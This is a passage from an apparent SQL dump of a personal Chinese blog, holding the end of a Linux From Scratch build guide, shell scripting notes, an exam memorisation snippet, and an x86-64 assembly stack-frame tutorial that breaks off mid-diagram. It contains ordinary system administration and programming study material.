/usr/lib/$LIB /tmp/$LIB\r\n    strip --strip-unneeded /tmp/$LIB\r\n    install -vm755 /tmp/$LIB /usr/lib\r\n    rm /tmp/$LIB\r\ndone\r\n\r\nfor i in $(find /usr/lib -type f -name \\*.so* ! -name \\*dbg) \\\r\n         $(find /usr/lib -type f -name \\*.a)                 \\\r\n         $(find /usr/{bin,sbin,libexec} -type f); do\r\n    case \"$online_usrbin $online_usrlib $save_usrlib\" in\r\n        *$(basename $i)* )\r\n            ;;\r\n        * ) strip --strip-unneeded $i\r\n            ;;\r\n    esac\r\ndone\r\n\r\nunset BIN LIB save_usrlib online_usrbin online_usrlib\r\n```\r\n\r\n#### 清理系统\r\n\r\n```sh\r\nrm -rf /tmp/*\r\n\r\nfind /usr/lib /usr/libexec -name \\*.la -delete\r\n\r\nfind /usr -depth -name $(uname -m)-lfs-linux-gnu\\* | xargs rm -rf\r\n```\r\n\r\n### 系统配置\r\n\r\n#### 一般网络配置\r\n\r\n> 如果系统根本没有连接网络，或者您希望使用另外的工具（NetworkManager ）进行网络配置\r\n>\r\n> ```sh\r\n> systemctl disable systemd-networkd-wait-online\r\n> ```\r\n\r\n```sh\r\nln -s /dev/null /etc/systemd/network/99-default.link\r\n\r\ncat > /etc/systemd/network/10-ether0.link << \"EOF\"\r\n[Match]\r\n# 将 MAC 地址替换为适用于您的网络设备的值\r\nMACAddress=12:34:45:78:90:AB\r\n\r\n[Link]\r\nName=ether0\r\nEOF\r\n\r\ncat > /etc/systemd/network/10-eth-static.network << \"EOF\"\r\n[Match]\r\nName=lfs\r\n\r\n[Network]\r\nAddress=192.168.0.2/24\r\nGateway=192.168.0.1\r\nEOF\r\n\r\ncat > /etc/systemd/network/10-eth-dhcp.network << \"EOF\"\r\n[Match]\r\nName=lfs\r\n\r\n[Network]\r\nDHCP=ipv4\r\n\r\n[DHCPv4]\r\nUseDomains=true\r\nEOF\r\n\r\ncat > /etc/resolv.conf << \"EOF\"\r\n# Begin /etc/resolv.conf\r\n\r\n#domain <您的域名>\r\nnameserver 114.114.114\r\nnameserver 8.8.8.8\r\n\r\n# End /etc/resolv.conf\r\nEOF\r\n\r\necho \"lfs\" > /etc/hostname\r\n\r\ncat > /etc/hosts << \"EOF\"\r\n# Begin /etc/hosts\r\n\r\n127.0.0.1	localhost	lfs\r\n::1			localhost\r\n127.0.1.1	lfs.localdomain	lfs\r\n\r\n# End /etc/hosts\r\nEOF\r\n```\r\n\r\n#### 设备和模块管理概述\r\n\r\n```sh\r\n\r\n```\r\n\r\n#### 配置系统时钟\r\n\r\n```sh\r\ncat > /etc/adjtime << \"EOF\"\r\n0.0 0 0.0\r\n0\r\nLOCAL\r\nEOF\r\n```\r\n\r\n#### 创建 /etc/inputrc 文件\r\n\r\n```sh\r\ncat > /etc/inputrc << \"EOF\"\r\n# Begin /etc/inputrc\r\n# Modified by Chris Lynn <roryo@roryo.dynup.net>\r\n\r\n# Allow the command prompt to wrap to the next line\r\nset horizontal-scroll-mode Off\r\n\r\n# Enable 8-bit input\r\nset meta-flag On\r\nset input-meta On\r\n\r\n# Turns off 8th bit stripping\r\nset convert-meta Off\r\n\r\n# Keep the 8th bit for display\r\nset output-meta On\r\n\r\n# none, visible or audible\r\nset bell-style none\r\n\r\n# All of the following map the escape sequence of the value\r\n# contained in the 1st argument to the readline specific functions\r\n\"\\eOd\": backward-word\r\n\"\\eOc\": forward-word\r\n\r\n# for linux console\r\n\"\\e[1~\": beginning-of-line\r\n\"\\e[4~\": end-of-line\r\n\"\\e[5~\": beginning-of-history\r\n\"\\e[6~\": end-of-history\r\n\"\\e[3~\": delete-char\r\n\"\\e[2~\": quoted-insert\r\n\r\n# for xterm\r\n\"\\eOH\": beginning-of-line\r\n\"\\eOF\": end-of-line\r\n\r\n# for Konsole\r\n\"\\e[H\": beginning-of-line\r\n\"\\e[F\": end-of-line\r\n\r\n# End /etc/inputrc\r\nEOF\r\n```\r\n\r\n#### 创建 /etc/shells 文件\r\n\r\n```sh\r\ncat > /etc/shells << \"EOF\"\r\n# Begin /etc/shells\r\n\r\n/bin/sh\r\n/bin/bash\r\n\r\n# End /etc/shells\r\nEOF\r\n```\r\n\r\n#### Systemd 使用和配置\r\n\r\n```sh\r\nmkdir -pv /etc/systemd/system/getty@tty1.service.d\r\n\r\ncat > /etc/systemd/system/getty@tty1.service.d/noclear.conf << EOF\r\n[Service]\r\nTTYVTDisallocate=no\r\nEOF\r\n```\r\n\r\n#### 创建 /etc/fstab 文件\r\n\r\n```sh\r\ncat > /etc/fstab << \"EOF\"\r\n# Begin /etc/fstab\r\n\r\n# 文件系统     挂载点       类型     选项                转储  检查\r\n#                                                              顺序\r\n\r\n/dev/sda3	/	ext4	defaults	1	1\r\n/dev/sda2	swap	swap	pri=1	0	0\r\n/dev/sda1 	/boot/efi 	vfat	codepage=437,iocharset=iso8859-1	0	1\r\n\r\nefivarfs	/sys/firmware/efi/efivarfs	efivarfs	defaults	0	0\r\n\r\nproc	/proc	proc	nosuid,noexec,nodev	0	0\r\nsysfs	/sys	sysfs	nosuid,noexec,nodev	0	0\r\ndevpts	/dev/pts	devpts	gid=5,mode=620	0	0\r\ntmpfs	/run	tmpfs	defaults	0	0\r\ndevtmpfs	/dev	devtmpfs	mode=0755,nosuid	0	0\r\n\r\n# End /etc/fstab\r\nEOF\r\n```\r\n\r\n#### Linux-6.7.4\r\n\r\n> 内核配置\r\n>\r\n> ```sh\r\n> General setup --->\r\n> [ ] Compile the kernel with warnings as errors                        [WERROR]\r\n> [ ] Auditing support                                                   [AUDIT]\r\n> CPU/Task time and stats accounting --->\r\n>  [*] Pressure stall information tracking                                [PSI]\r\n>  [ ]   Require boot parameter to enable pressure stall information tracking\r\n>                                                   ...  [PSI_DEFAULT_DISABLED]\r\n> < > Enable kernel headers through /sys/kernel/kheaders.tar.xz      [IKHEADERS]\r\n> [*] Control Group support --->                                       [CGROUPS]\r\n>  [*] Memory controller                                                [MEMCG]\r\n> [ ] Configure standard kernel features (expert users) --->            [EXPERT]\r\n> \r\n> Processor type and features --->\r\n> [*] EFI runtime service support                                          [EFI]\r\n> [*]   EFI stub support                                              [EFI_STUB]\r\n> [*] Support x2apic  											    [X86_X2APIC]\r\n> [*] Build a relocatable kernel                                   [RELOCATABLE]\r\n> [*]   Randomize the address of the kernel image (KASLR)       [RANDOMIZE_BASE]\r\n> \r\n> -*- Enable the block layer --->                                          [BLOCK]\r\n> Partition Types --->\r\n>  [ /*] Advanced partition selection                      [PARTITION_ADVANCED]\r\n>  [*]     EFI GUID Partition support                           [EFI_PARTITION]\r\n> \r\n> General architecture-dependent options --->\r\n> [*] Stack Protector buffer overflow detection                 [STACKPROTECTOR]\r\n> [*]   Strong Stack Protector                           [STACKPROTECTOR_STRONG]\r\n> \r\n> [*] Networking support --->                                                [NET]\r\n> Networking options --->\r\n>  [*] TCP/IP networking                                                 [INET]\r\n>  <*>   The IPv6 protocol --->                                          [IPV6]\r\n> \r\n> Device Drivers --->\r\n> [*] PCI support --->                                                     [PCI]\r\n>  [*] Message Signaled Interrupts (MSI and MSI-X)                    [PCI_MSI]\r\n> \r\n> [*] IOMMU Hardware Support --->                                [IOMMU_SUPPORT]\r\n>  [*] Support for Interrupt Remapping                              [IRQ_REMAP]\r\n> \r\n> Generic Driver Options --->\r\n>  [ ] Support for uevent helper                                [UEVENT_HELPER]\r\n>  [*] Maintain a devtmpfs filesystem to mount at /dev               [DEVTMPFS]\r\n>  [*]   Automount devtmpfs at /dev, after the kernel mounted the rootfs\r\n>                                                         ...  [DEVTMPFS_MOUNT]\r\n>  Firmware loader --->\r\n>    < /*> Firmware loading facility                                [FW_LOADER]\r\n>    [ ]     Enable the firmware sysfs fallback mechanism\r\n>                                                  ...  [FW_LOADER_USER_HELPER]\r\n> Firmware Drivers --->\r\n>  [*] Mark VGA/VBE/EFI FB as generic system framebuffer       [SYSFB_SIMPLEFB]\r\n>  [*] Export DMI identification via sysfs to userspace                 [DMIID]\r\n> \r\n> Graphics support --->\r\n>  <*> Direct Rendering Manager (XFree86 4.1.0 and higher DRI support) --->\r\n>                                                                    ...  [DRM]\r\n>  [*] Enable legacy fbdev support for your modesetting driver\r\n>                                                    ...  [DRM_FBDEV_EMULATION]\r\n>  <*> Simple framebuffer driver                                [DRM_SIMPLEDRM]\r\n>  Console display driver support --->\r\n>    [*] Framebuffer Console support                      [FRAMEBUFFER_CONSOLE]\r\n> \r\n>  Console display driver support --->\r\n>    # If [DRM] is selected as * or M, this must be selected:\r\n>    [ /*] Framebuffer Console support                    [FRAMEBUFFER_CONSOLE]\r\n> \r\n> File systems --->\r\n> DOS/FAT/EXFAT/NT Filesystems --->\r\n>  <*/M> VFAT (Windows-95) fs support                                 [VFAT_FS]\r\n> -*- Native language support --->                                         [NLS]\r\n>  <*/M> Codepage 437 (United States, Canada)                [NLS_CODEPAGE_437]\r\n>  <*/M> NLS ISO 8859-1  (Latin 1; Western European Languages)  [NLS_ISO8859_1]\r\n> [*] Inotify support for userspace                               [INOTIFY_USER]\r\n> Pseudo filesystems --->\r\n>  <*/M> EFI Variable filesystem                                    [EFIVAR_FS]     \r\n>  [*] Tmpfs virtual memory file system support (former shm fs)         [TMPFS]\r\n>  [*]   Tmpfs POSIX Access Control Lists                     [TMPFS_POSIX_ACL]\r\n> ```\r\n\r\n> 如果 LFS 系统分区在 NVME SSD 上 （即，分区的设备节点是 ，而非 ），启用 NVME 支持，否则 LFS 系统无法引导：`/dev/nvme*``/dev/sd*`\r\n>\r\n> ```sh\r\n> Device Drivers --->\r\n> NVME Support --->\r\n>  <*> NVM Express block device                                  [BLK_DEV_NVME]\r\n> ```\r\n\r\n```sh\r\ncd /sources\r\ntar -xf linux-6.7.4.tar.xz \r\ncd linux-6.7.4\r\n\r\nmake mrproper\r\nmake defconfig \r\nmake menuconfig\r\n\r\nmake -j8\r\nmake modules_install\r\n\r\ncp -iv arch/x86_64/boot/bzImage /boot/vmlinuz-6.7.4-lfs-12.1-systemd\r\ncp -iv System.map /boot/System.map-6.7.4\r\ncp -iv .config /boot/config-6.7.4\r\ncp -r Documentation -T /usr/share/doc/linux-6.7.4\r\n```\r\n\r\n#### 使用 GRUB 设定引导过程\r\n\r\n```sh\r\nmount --mkdir -v -t vfat /dev/sda1 -o codepage=437,iocharset=iso8859-1 /boot/efi\r\n\r\ngrub-install --target=x86_64-efi --removable\r\n\r\nmountpoint /sys/firmware/efi/efivars || mount -v -t efivarfs efivarfs /sys/firmware/efi/efivars\r\n\r\ngrub-install --bootloader-id=LFS --recheck\r\n\r\ncat > /boot/grub/grub.cfg << \"EOF\"\r\n# Begin /boot/grub/grub.cfg\r\nset default=0\r\nset timeout=5\r\n\r\ninsmod part_gpt\r\ninsmod ext2\r\nset root=(hd0,gpt3)\r\n\r\ninsmod all_video\r\nif loadfont /boot/grub/fonts/unicode.pf2; then\r\n  terminal_output gfxterm\r\nfi\r\n\r\nmenuentry \"GNU/Linux, Linux 6.7.4-lfs-12.1-systemd\" {\r\n	linux	/boot/vmlinuz-6.7.4-lfs-12.1-systemd	root=/dev/sda3	ro\r\n}\r\n\r\nmenuentry \"Firmware Setup\" {\r\n  fwsetup\r\n}\r\nEOF\r\n```\r\n\r\n#### 收尾工作\r\n\r\n```sh\r\necho 12.1-systemd > /etc/lfs-release\r\n\r\ncat > /etc/lsb-release << \"EOF\"\r\nDISTRIB_ID=\"Linux From Scratch\"\r\nDISTRIB_RELEASE=\"12.1-systemd\"\r\nDISTRIB_CODENAME=\"lfs\"\r\nDISTRIB_DESCRIPTION=\"Linux From Scratch\"\r\nEOF\r\n\r\ncat > /etc/os-release << \"EOF\"\r\nNAME=\"Linux From Scratch\"\r\nVERSION=\"12.1-systemd\"\r\nID=lfs\r\nPRETTY_NAME=\"Linux From Scratch 12.1-systemd\"\r\nVERSION_CODENAME=\"<your name here>\"\r\nHOME_URL=\"https://www.linuxfromscratch.org/lfs/\"\r\nEOF\r\n```\r\n\r\n> 最后重启成功\r\n>\r\n> ![](https://www.zhuguishihundan.cn/image/17c4d656d1174c1f.png)','2024-03-14 00:36:44','2024-04-10 14:11:05'),(100014,100000,'shell 笔记','# shell 笔记\r\n\r\n## 变量\r\n\r\n使用变量\r\n\r\n```sh\r\nNAME=\"linzui\"\r\necho $NAME\r\necho ${NAME} \r\n\r\nreadonly NAME #变量只读\r\n```\r\n\r\n删除变量\r\n\r\n```sh\r\nunset NAME\r\necho NAME\r\n```\r\n\r\n字符串\r\n\r\n```sh\r\nNAME=\"linzui\"\r\n\r\necho \'hello ${NAME}\' #单引号里面的任何字符都会原样输出\r\necho \"hello ${NAME}\"\r\n\r\necho ${#NAME} #获取字符串长度\r\necho ${NAME:3:3} #截取下标为3的字符起3个字符\r\n```\r\n\r\n数组\r\n\r\n```sh\r\nNAMES=(\"LinZui\" \"ZhuGui\")\r\necho ${NAMES[0]}\r\necho ${NAMES[@]} #全部数组\r\necho ${NAMES[*]} #全部数组\r\n```\r\n\r\nfor循环\r\n\r\n```sh\r\nNAMES=(\"LinZui\" \"ZhuGui\")\r\n\r\nfor i in $NAMES; do\r\n	echo $i\r\ndone\r\n```\r\n\r\n## 参数\r\n\r\n```sh\r\ncat > run.sh << \"EOF\"\r\n#!/bin/bash\r\n\r\necho \"执行的文件名：$0\"\r\necho \"第一个参数为：$1\"\r\necho \"第二个参数为：$2\"\r\nEOF\r\n\r\n./run.sh 1 2\r\n```\r\n\r\n##  运算符\r\n\r\nexpr是一款表达式计算工具\r\n\r\n```sh\r\nvar=`expr 2 + 2`\r\necho $var\r\n```\r\n\r\n### 算术运算符\r\n\r\n下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| 运算符 | 说明   | 举例                   |\r\n| ------ | ------ | ---------------------- |\r\n| +      | 加法   | `expr $a + $b` = 30    |\r\n| -      | 减法   | `expr $a - $b` = -10   |\r\n| *      | 乘法   | `expr $a \\* $b` = 200  |\r\n| /      | 除法   | `expr $b / $a` = 2     |\r\n| %      | 取余   | `expr $b % $a` = 0     |\r\n| =      | 赋值   | `a = $b`               |\r\n| ==     | 相等   | `[ $a == $b ]` = false |\r\n| !=     | 不相等 | `[ $a != $b ]` = true  |\r\n\r\n> 乘号`*`前边必须加反斜杠`\\`才能实现乘法运算\r\n\r\n### 关系运算符\r\n\r\n关系运算符只支持数字，不支持字符串，除非字符串的值是数字。\r\n\r\n下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| 运算符 | 说明                         | 举例                    |\r\n| :----- | :--------------------------- | :---------------------- |\r\n| -eq    | 两个数**相等**返回true       | `[ $a -eq $b ]` = false |\r\n| -ne    | 两个数**不相等**返回true     | `[ $a -ne $b ]` = true  |\r\n| -gt    | 左边**大于**右边返回true     | `[ $a -gt $b ]` = false |\r\n| -lt    | 左边**小于**右边返回true     | `[ $a -lt $b ]` = true  |\r\n| -ge    | 左边**大于等于**右边返回true | `[ $a -ge $b ]` = false |\r\n| -le    | 左边**小于等于**右边返回true | `[ $a -le $b ]` = true  |\r\n\r\n### 布尔运算符\r\n\r\n下表列出了常用的布尔运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| 运算符 | 说明          | 举例                                  |\r\n| :----- | :------------ | :------------------------------------ |\r\n| !      | true返回false | `[ ! false ]` = true                  |\r\n| -o     | 或运算        | `[ $a -lt 20 -o $b -gt 100 ]` = true  |\r\n| -a     | 与运算        | `[ $a -lt 20 -a $b -gt 100 ]` = false |\r\n\r\n### 逻辑运算符\r\n\r\n以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| 运算符 | 说明    | 举例                                     |\r\n| :----- | :------ | :--------------------------------------- |\r\n| &&     | 逻辑AND | `[[ $a -lt 100 && $b -gt 100 ]]` = false |\r\n| \\|\\|   | 逻辑OR  | `[[ $a -lt 100 || $b -gt 100 ]]` = true  |\r\n\r\n### 字符串运算符\r\n\r\n下表列出了常用的字符串运算符，假定变量 a 为 \"abc\"，变量 b 为 \"efg\"：\r\n\r\n| 运算符 | 说明                        | 举例                  |\r\n| :----- | :-------------------------- | :-------------------- |\r\n| =      | 字符串**相等**返回true      | `[ $a = $b ]` = false |\r\n| !=     | 字符串**不相等**返回true    | `[ $a != $b ]` = true |\r\n| -z     | 字符串**长度为0**返回true   | `[ -z $a ]` = false   |\r\n| -n     | 字符串**长度不为0**返回true | `[ -n $a ]` = true    |\r\n| $      | 字符串**不为空**返回true    | `[ $a ]` = true       |\r\n\r\n### 文件测试运算符\r\n\r\n文件测试运算符用于检测 Unix 文件的各种属性。\r\n\r\n属性检测描述如下：\r\n\r\n| 运算符 | 说明                         | 举例                                 |\r\n| ------ | ---------------------------- | ------------------------------------ |\r\n| -b     | 文件是**块设备**返回true     | `[ -b /dev/block/259:0 ]` = true     |\r\n| -c     | 文件是**字符设备**返回true   | `[ -c /dev/tty ]` = true             |\r\n| -d     | 文件是**目录**返回true       | `[ -d /root ]` = true                |\r\n| -f     | 文件是**普通文件**返回true   | `[ -f /etc/fstab ]` = true           |\r\n| -g     | 文件设置了**SGID位**返回true | `[ -g /bin ]` = false                |\r\n| -k     | 文件设置了**粘着位**返回true | `[ -k /tmp ]` = true                 |\r\n| -p     | 文件是**有名管道**返回true   | `[ -p /run/dmeventd-client ]` = true |\r\n| -u     | 文件设置了**SUID位**返回true | `[ -u /bin/sudo ]` = true            |\r\n| -r     | 文件**可读**返回true         | `[ -r /etc/fstab ]` = true           |\r\n| -w     | 文件**可写**返回true         | `[ -w /etc/fstab ]` = false          |\r\n| -x     | 文件**可执行**返回true       | `[ -x /bin/sudo ]` = true            |\r\n| -s     | 文件**不为空**返回true       | `[ -s /etc/fstab ]` = false          |\r\n| -e     | 文件**存在**返回true         | `[ -e /bin ]` = true                 |\r\n| -S     | 文件是**socket**返回true     | `[ -S /run/docker.sock ]` = true     |\r\n| -L     | 文件是**符合链接**返回true   | `[ -L /bin/sh ]` = true              |\r\n\r\n## 流程控制\r\n\r\n### if else\r\n\r\n```sh\r\nif [ 10 == 10 ]\r\nthen\r\n	echo \'10 == 10\'\r\nelse\r\n	echo \'10 != 10\'\r\nfi\r\n```\r\n\r\n```sh\r\nif condition; then command; else command; fi\r\n```\r\n\r\n### if else-if else\r\n\r\n```sh\r\na=10\r\nb=20\r\nif [ $a -gt $b ]\r\nthen\r\n	echo \'a > b\'\r\nelif [ $a -lt $b ]\r\nthen\r\n	echo \'a < b\'\r\nelse\r\n	echo \'a = b\'\r\nfi\r\n```\r\n\r\n```sh\r\nif condition; then command; elif condition; then command; else command; fi\r\n```\r\n\r\n### for\r\n\r\n```sh\r\nfor i in 1 2 3 4 5\r\ndo\r\n	echo $i\r\ndone\r\n```\r\n\r\n```sh\r\nfor var in item1 ... itemN; do command; command; done\r\n```\r\n\r\n### while\r\n\r\n```sh\r\nvar=1\r\nwhile (( $var <= 5 ))\r\ndo\r\n	echo $var\r\n	let \"var ++\"\r\ndone\r\n```\r\n\r\n```sh\r\nwhile :\r\ndo\r\n	echo \"死循环\"\r\ndone\r\n```\r\n\r\n### case ... esac\r\n\r\n```sh\r\necho \"输入1-4之间的数字\"\r\necho \"你输入的数字为：\"\r\nread num\r\ncase $num in\r\n	1) echo \"你输入了1\"\r\n	;;\r\n	2) echo \"你输入了2\"\r\n	;;\r\n	3) echo \"你输入了3\"\r\n	;;\r\n	4) echo \"你输入了4\"\r\n	;;\r\n	*) echo \"你没有输入1-4之间的数字\"\r\n	;;\r\nesac\r\n```\r\n\r\n### break\r\n\r\n```sh\r\nwhile :\r\ndo\r\n    echo -n \"输入 1 到 5 之间的数字:\"\r\n    read num\r\n    case $num in\r\n        1|2|3|4|5) echo \"你输入的数字为 $num!\"\r\n        ;;\r\n        *) echo \"你输入的数字不是 1 到 5 之间的! 游戏结束\"\r\n            break\r\n        ;;\r\n    esac\r\ndone\r\n```\r\n\r\n### continue\r\n\r\n```sh\r\nwhile :\r\ndo\r\n    echo -n \"输入 1 到 5 之间的数字: \"\r\n    read num\r\n    case $num in\r\n        1|2|3|4|5) echo \"你输入的数字为 $num!\"\r\n        ;;\r\n        *) echo \"你输入的数字不是 1 到 5 之间的!\"\r\n            continue\r\n            echo \"游戏结束\"\r\n        ;;\r\n    esac\r\ndone\r\n```\r\n\r\n## 函数\r\n\r\n### 函数参数\r\n\r\n```sh\r\nfunWithParam() {\r\n	for i in $*\r\n	do\r\n		echo $i\r\n	done\r\n}\r\n```\r\n\r\n| 参数处理 | 说明                                                         |\r\n| :------- | :----------------------------------------------------------- |\r\n| $#       | 传递到脚本或函数的参数个数                                   |\r\n| $*       | 以一个单字符串显示所有向脚本传递的参数                       |\r\n| $$       | 脚本运行的当前进程ID号                                       |\r\n| $!       | 后台运行的最后一个进程的ID号                                 |\r\n| $@       | 与$*相同，但是使用时加引号，并在引号中返回每个参数。         |\r\n| $-       | 显示Shell使用的当前选项，与set命令功能相同。                 |\r\n| $?       | 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 |\r\n\r\n## 输入/输出重定向\r\n\r\n','2024-03-25 21:07:44','2024-03-25 21:07:44'),(100015,100017,'公考默写','# 中共十九大（2017年10月）\r\n\r\n## 高频考点一  大会主题\r\n<!-- 不忘初心，牢记使命，高举中国特色社会主义伟大旗帜，决胜全面建成小康社会，夺取新时代中国特色社会主义伟大胜利，为实现中华民族伟大复兴的中国梦不懈奋斗。 -->\r\n不忘初心，牢记使命，高举中国特色社会主义伟大旗帜，决胜全面建成小康社会，夺取新时代中国特色社会主义伟大胜利，为实现中华民族伟大复兴的中国梦不懈奋斗。\r\n\r\n','2024-03-27 20:02:08','2024-04-17 20:59:43'),(100031,100000,'汇编','# 汇编栈帧\r\n\r\n尝试进一步理解汇编的**栈帧**，以下是一段C语言源码和其对应的汇编代码\r\n\r\n```c\r\nint func(int x) {\r\n	return x;\r\n}\r\n\r\nint add(int a, int b) {\r\n	return func(a) + b;\r\n}\r\n\r\nint main(void) {\r\n	int a = 3;\r\n	int b = 4;\r\n	int num = add(a, b);\r\n	return 0;\r\n}\r\n```\r\n\r\n```assembly\r\nfunc:\r\n.LFB0:\r\n	pushq	%rbp\r\n	movq	%rsp, %rbp\r\n	movl	%edi, -4(%rbp)\r\n	movl	-4(%rbp), %eax\r\n	popq	%rbp\r\n	ret\r\n\r\nadd:\r\n.LFB1:\r\n	pushq	%rbp\r\n	movq	%rsp, %rbp\r\n	subq	$8, %rsp\r\n	movl	%edi, -4(%rbp)\r\n	movl	%esi, -8(%rbp)\r\n	movl	-4(%rbp), %eax\r\n	movl	%eax, %edi\r\n	call	func\r\n	movl	-8(%rbp), %edx\r\n	addl	%edx, %eax\r\n	leave\r\n	ret\r\n\r\nmain:\r\n.LFB2:\r\n	pushq	%rbp\r\n	movq	%rsp, %rbp\r\n	subq	$16, %rsp\r\n	movl	$3, -12(%rbp)\r\n	movl	$4, -8(%rbp)\r\n	movl	-8(%rbp), %edx\r\n	movl	-12(%rbp), %eax\r\n	movl	%edx, %esi\r\n	movl	%eax, %edi\r\n	call	add\r\n	movl	%eax, -4(%rbp)\r\n	movl	$0, %eax\r\n	leave\r\n	ret\r\n```\r\n\r\n> 该汇编代码已去除多余符号，==无法运行==\r\n\r\n## 汇编指令（`push pop call leave ret`）\r\n\r\n> 假设你已经会了一些基本的汇编指令\r\n\r\n### push\r\n\r\n`pushq	%rbp` 将 `%rbp` 的数值压入栈中，可分解为：\r\n\r\n`subq	$8, %rsp` -> `%rsp = %rsp - 8`\r\n\r\n`movq	%rbp, (%rsp)` -> `*(int64*)%rsp = %rbp` 将`%rbp`的值赋值给`%rsp`的数值指向的地址的位置\r\n\r\n### pop\r\n\r\n`popq	%rbp` 将栈顶的数据弹出并赋值给`%rbp`寄存器，可分解为：\r\n\r\n`movq	(%rsp), %rbp` -> `%rbp = *(int64*)(%rsp)` 将`%rsp`的数值指向的地址的值赋值给`%rbp`\r\n\r\n`addq	$8, %rsp` -> `%rsp = %rsp + 8`\r\n\r\n### call\r\n\r\n> `%rip`可以粗略地理解为下一条CPU执行的指令的位置\r\n\r\n`call	add`  将`add`跳转到这个代码段的地址然后执行（执行函数），可分解为：\r\n\r\n`pushq	%rip` 将`%rip`的值入栈（保存当前代码段的位置，方便调用的函数执行完回到这个地方）\r\n\r\n`movq	$0x12345, %rip` 跳转到`$0x12345`这个位置去执行指令\r\n\r\n### leave\r\n\r\n`leave` 清空当前栈帧，可分解为：\r\n\r\n`movq	%rbp, %rsp` \r\n\r\n`popq	%rbp` \r\n\r\n> `leave` 是为`ret` 作铺垫，`leave`指令执行完 栈顶的数据就是之前压入栈的旧`rip`值\r\n\r\n### ret\r\n\r\n`ret` 返回call之前的地址，可分解为：\r\n\r\n`popq	%rip` 将`call`压入栈的**旧**`%rip`的值重新出栈赋值给`%rip`\r\n\r\n## 逐行分析汇编\r\n\r\n在此之前先了解一些基本的知识\r\n\r\n- `movl`指令由两部分组成`mov + l`，`b w l q`分别代表对`1 2 4 8`个字节的操作。\r\n- `%rax`寄存器细分一下，`ah 高8位`、`al 低8位`、`ax 16位`、`eax 32位`、`rax 64位`。\r\n- `%rbp`寄存器存储的值是栈底，`%rsp`寄存器存储的值是栈顶，假如当前栈帧地址是`0x1000`到`0xFF0`。那么`%rbp`=`0x1000`，`rsp`=`0xFF0`。这段空间的大小为`0x1000-0xFF0=0x10`也就是`16`个字节。\r\n\r\n- `push`入栈就是在`%rsp`后面开辟一段空间，然后将需要入栈的数据放进入，并改变`%rsp`的值\r\n- `movl	$4, -8(%rbp)`假设这个时候`rbp`的值为`0x1000`。那么`-8(%rbp)`的值就是是`0x1000-0x8=0xFF8`。由于是`movl`指令，这个时候`$4`这个立即数占`4`个字节，那么`$4`占用的内存的位置就是`0xFFC -> 0xFF8`这段地址。\r\n\r\n开始逐行分析：\r\n\r\n### `初始状态`\r\n\r\n|------------------|`0x1000`=`%rsp`\r\n\r\n\r\n\r\n### `pushq	%rbp`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp`\r\n\r\n|------------------|`0xFF8`=`%rsp`\r\n\r\n\r\n\r\n### `movq	%rsp, %rbp`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp`\r\n\r\n|------------------|`0xFF8`=`%rbp`=`%rsp`\r\n\r\n\r\n\r\n### `subq	$16, %rsp`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp`\r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFF4`\r\n\r\n|\r\n\r\n|------------------|`0xFF0`\r\n\r\n|\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`=`%rsp`\r\n\r\n\r\n\r\n### `movl	$3, -12(%rbp)`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFF4`\r\n\r\n|\r\n\r\n|------------------|`0xFF0`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`=`%rsp`\r\n\r\n\r\n\r\n### `movl	$4, -8(%rbp)`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFF4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFF0`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`=`%rsp`\r\n\r\n\r\n\r\n### `movl	-8(%rbp), %edx`\r\n\r\n### `movl	-12(%rbp), %eax`\r\n\r\n### `movl	%edx, %esi`\r\n\r\n### `movl	%eax, %edi`\r\n\r\n\r\n\r\n### `call	add`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFF4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFF0`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`   \r\n\r\n|------------------|`0xFE0`=`%rsp`\r\n\r\n\r\n\r\n### `pushq	%rbp`\r\n\r\n> 进入add函数后就只分析该函数栈帧\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rsp`\r\n\r\n\r\n\r\n### `movq	%rsp, %rbp`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`=`%rsp`\r\n\r\n\r\n\r\n### `subq	$8, %rsp`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFD4`\r\n\r\n|\r\n\r\n|------------------|`0xFD0`=`%rsp`\r\n\r\n\r\n\r\n### `movl	%edi, -4(%rbp)`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  